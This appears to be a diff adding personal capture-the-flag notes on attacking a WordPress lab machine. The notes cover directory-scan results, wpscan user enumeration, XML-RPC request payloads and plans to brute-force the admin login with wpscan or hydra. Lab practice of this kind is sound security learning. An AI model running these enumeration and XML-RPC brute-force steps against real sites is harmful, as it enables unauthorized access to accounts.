@@ -1,0 +1,82 @@
+/.hta => 403
+/.htaccess => 403
+/.htpasswd => 403
+/blog => 301
+/index.html => 200
+/javascript => 301
+/phpmyadmin => 301
+/server-status => 403
+/wordpress => 301
+
+
+-Note:
+	hta files allow dev to configure the site without having to touch server
+	config files
+	
+-Note:
+	site is running wordpress
+	/blog/wp-admin => 301
+	/blog/wp-content => 301
+	/blog/wp-includes => 301
+	/blog/xmlrpc.php => 301
+
+Vulnerability point:
+	xmlrpc.php an exploit known specifically on wordpress apps and only accpets
+	POST requests. Run:
+	    <methodCall>
+	    <methodName>system.listMethods</methodName>
+	    <params></params>
+	    </methodCall>
+	to determine actions to take and to be leveraged in an exploit
+	using xmlrpc.php can be used to bruteforce a login.php but username must
+	be obtained first
+	
+-Note:
+	WPscan is a tool to enumerate assets on a wordpress machine
+	
+payloads:
+
+wpscan --url http://10.10.205.213/ --enumerate -t => wrong argument won't bother
+wpscan --url http://10.10.205.213/ --enumerate => wordpress not detected
+wpscan --url http://10.10.205.213/blog --enumerate => success
+[i] User(s) Identified:
+
+[+] admin
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+ 
+Users:
+admin
+
+<methodCall>
+<methodName>wp.getUsersBlogs</methodName>
+<params>
+<param><value>admin</value></param>
+<param><value>pass</value></param>
+</params>
+</methodCall> 
+
+
+-Note:
+	Burp Suite intruder does not allow rockyou or any other super long wordlist
+	to be used in a bruteforce attack.
+	options:
+	wpscan
+	hydra
+	
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ 
+ 
